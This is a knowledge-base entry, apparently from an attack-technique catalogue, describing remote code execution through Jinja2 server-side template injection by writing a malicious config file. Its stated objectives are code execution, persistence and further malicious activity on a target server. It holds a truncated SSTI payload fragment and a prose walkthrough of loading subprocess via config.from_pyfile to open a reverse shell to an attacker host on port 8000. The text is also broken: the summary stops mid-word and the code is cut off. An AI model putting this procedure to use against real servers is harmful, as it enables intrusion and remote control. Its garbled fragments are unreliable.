---
id: bc172beb-5b7f-444c-abf7-100525fcd937
name: Jinja2 Remote Code Execution via SSTI in Evil Config File
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:39.880616+00:00'
updated_at: '2023-04-10T20:23:48.518964+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Exploit the SSTI by writing an evil config file.]]'
- '[[Jinja2]]'
- '[[Jinja2 - Remote Code Execution]]'
- '[[Server Side Template Injection]]'
---

# Jinja2 Remote Code Execution via SSTI in Evil Config File

## Summary

Jinja2 is a popular templating engine for Python. Server Side Template Injection (SSTI) vulnerabilities in Jinja2 can lead to remote code execution (RCE) attacks. In this procedure, we exploit the SSTI vulnerability by writing an evil config file. An attacker can craft a malicious payload to execut

## Description

# Description

Jinja2 is a popular templating engine for Python. Server Side Template Injection (SSTI) vulnerabilities in Jinja2 can lead to remote code execution (RCE) attacks. In this procedure, we exploit the SSTI vulnerability by writing an evil config file. An attacker can craft a malicious payload to execute arbitrary code on the target server. This attack can be used to achieve persistence and execute further malicious activities.

 

## Requirements

1. Access to the target server

1. Knowledge of the target server's configuration

1. Python installed on the target server

 

## Defense

1. Validate and sanitize user input to prevent SSTI vulnerabilities

1. Implement strict input validation and sanitization in the application code

1. Regularly update and patch the application and its dependencies

 

## Objectives

1. Execute arbitrary code on the target server

1. Achieve persistence on the target server

1. Perform further malicious activities on the target server

 

# Instructions

1. This command allows an attacker to execute arbitrary code remotely on the target machine. The code is executed in the context of the Python interpreter.

 



**Code**: [[# evil config
{{ ''.__class__.__mro__[2].__subclas]]



> The command first creates a file named 'evilconfig.cfg' in the '/tmp' directory and writes Python code to it that imports the 'check_output' function from the 'subprocess' module and assigns it to a variable named 'RUNCMD'. The file is then loaded using the 'from_pyfile' method of the 'config' object. Finally, the 'RUNCMD' variable is called with the command to execute as an argument, which is a reverse shell that connects to the attacker's machine on IP address 'x.x.x.x' and port '8000'. The 'shell=True' argument is passed to ensure that the command is executed using the shell.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Scripting|T1064 - Scripting]]

## Tags

- [[Exploit the SSTI by writing an evil config file.]]
- [[Jinja2]]
- [[Jinja2 - Remote Code Execution]]
- [[Server Side Template Injection]]


